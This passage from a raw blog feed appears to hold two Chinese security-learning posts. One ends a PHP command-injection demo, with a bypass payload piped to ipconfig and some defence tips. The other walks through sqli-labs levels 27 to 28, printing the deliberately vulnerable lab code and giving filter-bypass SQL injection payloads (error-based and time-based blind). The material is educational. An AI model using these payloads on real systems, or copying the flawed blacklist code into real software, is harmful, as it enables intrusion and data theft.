text/html;charset=utf-8&quot;);</span><br><span class="line">if(isset($_GET[&apos;host&apos;]))&#123;</span><br><span class="line">    $ud=$_GET[&apos;host&apos;];</span><br><span class="line">    $j=check($ud);</span><br><span class="line">    echo &quot;payload：$j&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $zx=system(&quot;ping &quot;.$j);</span><br><span class="line">    echo $zx;</span><br><span class="line">    echo &quot;&lt;script&gt;document.getElementById(&apos;demo&apos;).innerText=$zx&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function check($v)&#123;</span><br><span class="line">    $black_list=array(&apos;;&apos;=&gt;&apos;&apos;,&apos;&amp;&apos;=&gt;&apos;&apos;);</span><br><span class="line">    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/</span><br><span class="line">    return $th;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>&amp;和；被过滤掉了，那么我们用|代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ipconfig</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/29/kQLxcd.png" alt="kQLxcd.png"></p><p>过滤更严谨一点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;命令注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;输入IP&lt;/p&gt;</span><br><span class="line">&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;</span><br><span class="line">    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;);</span><br><span class="line">if(isset($_GET[&apos;host&apos;]))&#123;</span><br><span class="line">    $ud=$_GET[&apos;host&apos;];</span><br><span class="line">    $j=check($ud);</span><br><span class="line">    echo &quot;payload：$j&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $zx=system(&quot;ping &quot;.$j);</span><br><span class="line">    echo $zx;</span><br><span class="line">    echo &quot;&lt;script&gt;document.getElementById(&apos;demo&apos;).innerText=$zx&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function check($v)&#123;</span><br><span class="line">    $black_list=array(&apos;;&apos;=&gt;&apos;&apos;,&apos;&amp;&apos;=&gt;&apos;&apos;,&apos;||&apos;=&gt;&apos;&apos;,&apos;|&apos;=&gt;&apos;&apos;,&apos;)&apos;=&gt;&apos;&apos;,&apos;(&apos;=&gt;&apos;&apos;);</span><br><span class="line">    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/</span><br><span class="line">    return $th;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>或许这样可以防御大部分攻击，但是并不能完全保证不会被FUZZ绕过，而且未来说不定也会有办法什么之类的。<br>防御方案有两个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在获取用户输入后，用正则匹配出要进行命令执行的</span><br><span class="line">2.加入token机制，表单限制为只能输入数字</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 27 -&gt; sqli-labs Less 30</title>
      <link href="/posts/178a3f65.html"/>
      <url>/posts/178a3f65.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天从sqli-labs第27关撸到了30关，emmm。还真多<br><img src="https://m.chinawbk.com/images/hk/Webh_C_ykHFh_C_yF4SjUjebh_C_ybVH8_P_94Obxpg1fMg4buDb1xuMKObU4bODKOfx1h_C_yGWxJ.jpg" alt="Webh_C_ykHFh_C_yF4SjUjebh_C_ybVH8_P_94Obxpg1fMg4buDb1xuMKObU4bODKOfx1h_C_yGWxJ.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先先看代码：<br>27关代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-27 Trick with SELECT &amp; UNION&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-27.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-27-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>union和select都过滤掉了，这里有两个办法可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.双写被过滤的</span><br><span class="line">2.用/**/切割关键字，由于/**/会被匹配到然后替换为空</span><br><span class="line"></span><br><span class="line">1 payload :ununionion%a0seselectlect</span><br><span class="line">2 payload:un/**/ion/**/se/**/lect</span><br></pre></td></tr></table></figure></p><p><a href="http://35.201.152.114:8000/Less-27/?id=1%27%a0and%a0updatexml(1,concat(0x7e,(sel/**/ect%a0user(" target="_blank" rel="noopener">Less-27 Trick with SELECT &amp; UNION</a>),0x7e),1)|%271)</p><p><img src="https://s2.ax1x.com/2019/01/28/kMa05d.png" alt="kMa05d.png"></p><p>第27a,代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-27 Trick with SELECT &amp; UNION&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line">$id = &apos;&quot;&apos; .$id. &apos;&quot;&apos;;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);    //Strip out Select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-27a.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-27a-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这关和27关一样，只不过把报错输出注释了，用盲注吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.201.152.114:8000/Less-27a/?id=1%22%a0and%a0sleep(if((length(database())=8),1,4))|%221</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/28/kMdCM6.md.png" alt="kMdCM6.md.png"></p><p>第28关代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-28 Trick with SELECT &amp; UNION&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);    //Strip out UNION &amp; SELECT.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-28.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-28-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这个好像是匹配union+select，就是union到select这个地方，绕过方式也一样用 /**/代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 